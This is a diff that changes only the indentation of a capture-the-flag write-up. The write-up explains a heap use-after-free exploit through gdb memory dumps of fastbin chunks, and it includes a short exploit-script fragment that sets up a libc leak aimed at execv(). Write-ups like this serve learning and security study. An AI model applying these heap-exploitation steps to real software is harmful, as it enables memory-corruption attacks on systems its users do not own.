@@ -33,29 +33,29 @@
  - After `buy()`, it will apply for a chunck to store the name. 
 
 	```
-		(gdb) x/20x 0x5655ea20
-		0x5655ea20:	0x00000000	0x00000011	0x41414141	0x42424242 <-- old name
-		0x5655ea30:	0x00000000	0x000205d1	0x00000000	0x00000000
-		0x5655ea40:	0x00000000	0x00000000	0x00000000	0x00000000
+	(gdb) x/20x 0x5655ea20
+	0x5655ea20:	0x00000000	0x00000011	0x41414141	0x42424242 <-- old name
+	0x5655ea30:	0x00000000	0x000205d1	0x00000000	0x00000000
+	0x5655ea40:	0x00000000	0x00000000	0x00000000	0x00000000
 	```
 
  - Then, the `rename()` will apply a new chunck to store the new name and free the old name chunck back to the fastbin.
 
-		```
-		(gdb) x/20x 0x5655ea20
-		0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
-		0x5655ea30:	0x00000000	0x00000011	0x43434343	0x44444444 <-- new name
-		0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
-		```
+	```
+	(gdb) x/20x 0x5655ea20
+	0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
+	0x5655ea30:	0x00000000	0x00000011	0x43434343	0x44444444 <-- new name
+	0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
+	```
 
  - After the `drop()`, the program will also free the new name chunck and this will connect with the old name chunck which is the same size. So, the `FD` pointer in the new name chunck will contains the address of the old name chunck.
 
-		```
-		(gdb) x/20x 0x5655ea20
-		0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
-		0x5655ea30:	0x00000000	0x00000011	0x5655ea20	0x44444444 <-- new name
-		0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
-		```
+	```
+	(gdb) x/20x 0x5655ea20
+	0x5655ea20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- old name
+	0x5655ea30:	0x00000000	0x00000011	0x5655ea20	0x44444444 <-- new name
+	0x5655ea40:	0x00000000	0x000205c1	0x00000000	0x00000000
+	```
 
 ### II. Leak the `execv()` function address in libc.so.6
 
@@ -64,7 +64,7 @@
 2. To leak something of libc, we need to apply the memory from the **main_arena**, which means we need to create two long name objects and free the first chunck then use it.
 
 	```
-		#Secend UAF, leak the libc
+	#Secend UAF, leak the libc
       	buy(256, "AAAABBBB") #Index 0
       	buy(256, "CCCCDDDD") #Index 1
       	select(0)
